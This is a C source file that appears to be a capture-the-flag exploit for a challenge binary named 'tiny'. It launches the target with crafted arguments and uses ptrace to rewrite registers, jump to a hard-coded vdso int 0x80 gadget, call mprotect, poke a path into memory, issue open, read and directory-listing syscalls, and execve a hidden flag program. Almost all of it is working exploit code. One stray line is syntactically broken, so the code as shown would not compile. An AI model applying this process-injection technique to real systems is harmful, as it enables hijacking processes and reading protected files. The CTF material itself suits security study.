#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <errno.h>

#define VDSO_START (0xf7755000) // changes due to ASLR, low entropy. Example start
#define int80_offest (0xb57) // remote offset to int 0x80 gadget on the vdso
#define INT80 (0xf7742b57)

char secret_exec[] = "/home/tiny_hard/flag_is_in_here/this_is_executable_run_it_to_get_flag";
// 0xf7742b57

int run_syscall(pid_t pid, int syscall_number, int first_paramter, int second_parameter, int third_paramter) {
    struct user_regs_struct regs = { 0 };
    ptrace(PTRACE_GETREGS, pid, 0, &regs);
    regs.eip = INT80;
    regs.eax = syscall_number;
    regs.ebx = first_paramter;
    regs.ecx = second_parameter;
    regs.edx = third_paramter;
    ptrace(PTRACE_SETREGS, pid, 0, &regs);
    ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
}

char address[] = { 0x57, 0x2b, 0x74, 0xf7 }; // another legit address
char *ARG = "/bin/sh";
//char exploit[] = "ls -la /home/tiny_hard/flag_is_in_here > /tmp/itay_tiny_hard/FLAG\n";

void run_bash_with_ptrace(pid_t pid) {
//printf("Parents starts waiting..\n");
int status;
wait(&status);
if (status < 200)
{return;
}
    
struct user_regs_struct regs = { 0 };
ptrace(PTRACE_GETREGS, pid, 0, &regs);

regs.eip = 0x08048074;
regs.eax = 11;
regs.ebx = regs.esp;
regs.ecx = regs.esp;
regs.edx = regs.esp;
ptrace(PTRACE_SETREGS, pid, 0, &regs);
ptrace(PTRACE_SINGLESTEP, pid, 0, 0);
wait(&status);
ptrace(PTRACE_GETREGS, pid, 0, &regs);
printf("[*]First wait landed, single stepping..\nRegisters values:\nEAX:%08x\nORIG_EAX:%08x\nESP:%08x\nEBP:%08x\nEIP:%08x, should be 0xf7742b59\n\n\n\n\n\n", regs.eax, regs.orig_eax, regs.esp, regs.ebp, regs.eip);

run_syscall(pid, 125, 0x8048000, 0x1000, 7);
wait(&status);
ptrace(PTRACE_GETREGS, pid, 0, &regs);
printf("[*]mprotect syscall was made..\nRegisters values:\nEAX:%08x\nORIG_EAX:%08x\nESP:%08x\nEBP:%08x\nEIP:%08x, should be 0xf7742b59\n\n\n\n\n\n", regs.eax, regs.orig_eax, regs.esp, regs.ebp, regs.eip);

ptrace(PTRACE_POKETEXT, pid, 0x8048200, 0x6d6f682f);
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 4, 0x69742f65);
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 8, 0x662f796e);
ptrace(PTRACE_POKETEXT, pid, 0x8048200 + 12, 0x0067616c); // changed 61->60

run_syscall(pid, 5, 0x8048200, 0 , 0); // Open
wait(NULL);
ptrace(PTRACE_GETREGS, pid, 0, &regs);
int flag_fd = regs.eax;
printf("Open syscall worked, flag fd: %d\n", flag_fd);
printf("[*]open syscall was made..\nRegisters values:\nEAX:%08x\nORIG_EAX:%08x\nESP:%08x\nEBP:%08x\nEIP:%08x, should be 0xf7742b59\n\n\n\n\n\n", regs.eax, regs.orig_eax, regs.esp, regs.ebp, regs.eip);

/printf("empty_buf before read:%p\n", empty_buf);
run_syscall(pid, 3, flag_fd, 0x08048700, 100); // Read
wait(NULL);
ptrace(PTRACE_GETREGS, pid, 0, &regs);
printf("read %d bytes\n",  regs.eax);
/*
run_syscall(pid, 89, flag_fd, 0x08048700, 1); // read single dirent
wait(NULL);
run_syscall(pid, 89, flag_fd, 0x08048700, 1); // read single dirent
wait(NULL);
run_syscall(pid, 89, flag_fd, 0x08048700, 1); // read single dirent
wait(NULL);
*/
long inode_num = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700, 0);
long offset_val = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 4,0);
long length_and_name = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 8, 0);
long name1 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 12, 0);
long name2 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 16, 0);
long name3 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 20, 0);
long name4 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 24, 0);
long name5 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 28, 0);
long name6 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 32, 0);
long name7 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 36, 0);
long name8 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 40, 0);
long name9 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 44, 0);
long name10 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 48, 0);
long name11 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 52, 0);
long name12 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 56, 0);
long name13 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 60, 0);
long name14 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 64, 0);
long name15 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 68, 0);
long name16 = ptrace(PTRACE_PEEKTEXT, pid, 0x08048700 + 72, 0);

printf("inode:%p\noffset_val:%p\nlengthandNAME:%p\nname1:%p\nname2:%p\nname3:%p\nname4:%p\nname5:%p\nname6:%p\nname7:%p\nname8:%p\n,name9:%p\n,name10:%p\n,name11:%p\n,name12:%p\n,name13:%p\n,name14:%p\n,name15:%p\n,name16:%p\n",inode_num, offset_val, length_and_name, name1, name2, name3, name4, name5, name6, name7, name8, name9, name10, name11, name12, name13, name14, name15, name16);
run_syscall(pid, 11, secret_exec, secret_exec, 0); // get flag
wait(&status);
printf("child done executing!\ncode:%d",status);
}

void main(void) {
char flag_buf[50] = {0};
    int pipefd[2];
    if (pipe(pipefd) < 0) {
        perror("pipe");
        return;
    }
    pid_t pid = fork();
    if (-1 == pid) {
        perror("fork");
        return;
    }

    if (0 == pid) {
	close(pipefd[0]);
	dup2(pipefd[1], 1); // make sure user terminal receives output    	
//printf("[*] Child entered\n");
	dup2(pipefd[1], 2);
        execl("/home/tiny/tiny", address, "AAAA", "BBBB", ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, ARG, "/bin/sh", "-c", "/bin/ls -la > /tmp/itay_tiny_hard/NEW_FLAG", NULL);
        perror("execl");
    }
    else {
	close(pipefd[1]);
	// write(pipefd[1], exploit, sizeof(exploit));	
//printf("[*] Parent entered. Child pid: %d\n", pid);
        run_bash_with_ptrace(pid);
	printf("Done running, reading input..\n");	
read(pipefd[0], flag_buf, 50);
	printf("got flag: %s", flag_buf);
    }
}

